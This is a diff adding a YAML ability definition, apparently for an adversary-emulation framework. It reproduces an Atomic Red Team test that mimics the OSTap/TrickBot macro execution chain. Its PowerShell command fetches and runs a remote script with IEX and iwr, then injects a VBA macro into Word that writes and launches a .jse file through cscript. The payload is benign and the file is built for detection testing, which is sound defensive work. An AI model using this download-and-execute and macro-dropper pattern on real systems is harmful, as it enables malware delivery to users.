@@ -1,0 +1,27 @@
+---
+- id: 431121fe12b6fd82938a9a52526b3423
+  name: OSTap Style Macro Execution
+  description: "This Test uses a VBA macro to create and execute #{jse_path} with\
+    \ cscript.exe. Upon execution, the .jse file launches wscript.exe.\nExecution\
+    \ is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1)\
+    \ to load and execute VBA code into Excel or Word documents.\nThis is a known\
+    \ execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.\n\
+    References:\n  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader\n"
+  tactic: execution
+  technique:
+    attack_id: T1204.002
+    name: 'User Execution: Malicious File'
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
+          -UseBasicParsing); $macrocode = "   Open `"C:\Users\Public\art.jse`" For
+          Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe
+          C:\Users\Public\art.jse`"`n"; Invoke-MalDoc -macroCode $macrocode -officeProduct
+          "Word"'
+        payloads: []
+        cleanup: Remove-Item C:\Users\Public\art.jse -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
